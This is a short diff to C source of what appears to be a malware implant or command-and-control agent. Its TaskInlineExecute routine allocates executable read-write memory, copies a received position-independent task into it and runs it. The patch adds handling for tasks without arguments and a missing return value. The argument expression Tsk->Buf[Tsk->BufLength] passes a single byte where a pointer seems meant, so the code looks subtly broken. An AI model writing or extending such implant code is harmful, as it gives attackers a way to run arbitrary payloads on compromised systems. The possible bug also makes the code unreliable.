@@ -79,15 +79,18 @@ D_SEC( B ) DWORD TaskInlineExecute( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, 
 	/* Create a buffer to hold the task */
 	if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Mem, 0, &Len, MEM_COMMIT, PAGE_EXECUTE_READWRITE ) ) ) {
 		/* Copy over the position independent task */
-		__builtin_memcpy( C_PTR( Mem ), Tsk->Buf, Tsk->BufLength );
+		__builtin_memcpy( Mem, Tsk->Buf, Tsk->BufLength );
 
 		/* Set pointers for the output */
 		Rpi.RogueOutput = C_PTR( G_PTR( RogueOutput ) );
 		Rpi.RoguePrintf = C_PTR( G_PTR( RoguePrintf ) );
 
 		/* Set pointer and execute the inline function */
-		Fcn = C_PTR( Mem ); Ret = 
-		Fcn( &Rpi, Context, Tsk->Buf[ Tsk->BufLength ], Tsk->ArgLength, Output );
+		if ( Tsk->ArgLength != 0 ) {
+			Fcn = C_PTR( Mem ); Ret = Fcn( &Rpi, Context, Tsk->Buf[ Tsk->BufLength ], Tsk->ArgLength, Output );
+		} else {
+			Fcn = C_PTR( Mem ); Ret = Fcn( &Rpi, Context, NULL, 0, Output );
+		};
 
 		/* Cleanup */
 		Len = 0; 
@@ -97,4 +100,7 @@ D_SEC( B ) DWORD TaskInlineExecute( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Rpi, sizeof( Rpi ) );
+
+	/* Return */
+	return Ret;
 };
